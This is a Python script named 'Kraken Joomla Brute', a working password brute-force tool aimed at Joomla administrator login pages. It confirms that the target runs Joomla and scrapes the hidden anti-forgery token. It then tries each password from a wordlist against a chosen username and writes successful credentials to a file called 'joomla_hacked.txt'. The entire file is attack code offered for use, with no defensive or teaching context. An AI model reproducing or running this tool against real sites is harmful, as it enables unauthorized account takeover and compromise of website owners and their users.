import os
import sys
import time
import requests
import re
import logging
from random import choice
from colorama import Fore, Style, init


init(autoreset=True)


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'joomla_brute.log'), 
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    print(Style.BRIGHT + banner_color + "Kraken Joomla Brute")
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def validate_joomla(site):
    """Validates if the site is a Joomla site."""
    print(Fore.CYAN + "[*] Validating site...")
    try:
        r = requests.get(f'{site}/administrator/index.php', timeout=10)
        if 'Joomla' in r.text or 'mod-login' in r.text:
            print(Fore.GREEN + "[+] Joomla site confirmed.")
            return True
        else:
            print(Fore.RED + "[-] Not a Joomla site.")
            return False
    except Exception as e:
        print(Fore.RED + f"[-] Validation error: {e}")
        return False

def get_user_input():
    """Gathers user input for the Joomla brute force operation."""
    site = input(Fore.WHITE + '[i] Enter the target Joomla site (e.g., example.com): ').strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site

    if not validate_joomla(site):
        sys.exit(1)

    username = input(Fore.WHITE + "[i] Enter username: ").strip()
    if not username:
        print(Fore.RED + "[-] Username cannot be empty!")
        sys.exit(1)

    password_file = input(Fore.WHITE + "[i] Enter password file (default: passwords.txt): ").strip() or "passwords.txt"

    if not os.path.isfile(password_file):
        print(Fore.RED + f"[-] Password list file not found: {password_file}")
        sys.exit(1)

    return site, username, password_file

def attempt_login(site, username, password):
    """Attempts to log in to the Joomla site using provided credentials."""
    sess = requests.Session()
    try:
        response = sess.get(f'{site}/administrator/index.php', timeout=5)
        token_search = re.search(r'type="hidden" name="(.*)" value="1"', response.text)
        option_search = re.search(r'type="hidden" name="option" value="(.*)"', response.text)

        token = token_search.group(1) if token_search else ''
        option = option_search.group(1) if option_search else 'com_login'

        post_data = {
            'username': username,
            'passwd': password,
            'lang': 'en-GB',
            'option': option,
            'task': 'login',
            token: '1'
        }

        login_response = sess.post(f'{site}/administrator/index.php', data=post_data, timeout=10)

        if 'joomla_admin_session' in str(login_response.cookies) or 'logout' in login_response.text:
            print(Fore.GREEN + f"[+] Success: {username}:{password}")
            with open(os.path.join(results_dir, 'joomla_hacked.txt'), 'a') as writer:
                writer.write(f'Site: {site}\nUsername: {username}\nPassword: {password}\n{"-"*40}\n')
            return True
        else:
            print(Fore.MAGENTA + f"[*] Failed: {username}:{password}")
            return False

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")
        return False

def run_bruteforce(site, username, passwords):
    """Runs brute-force attack."""
    for password in passwords:
        if attempt_login(site, username, password):
            break

def main():
    clear_console()
    display_banner()

    site, username, password_file = get_user_input()

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file if line.strip()]

    print(Fore.WHITE + "\n" + "="*80 + "\n")
    run_bruteforce(site, username, passwords)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[-] Script interrupted by user.")
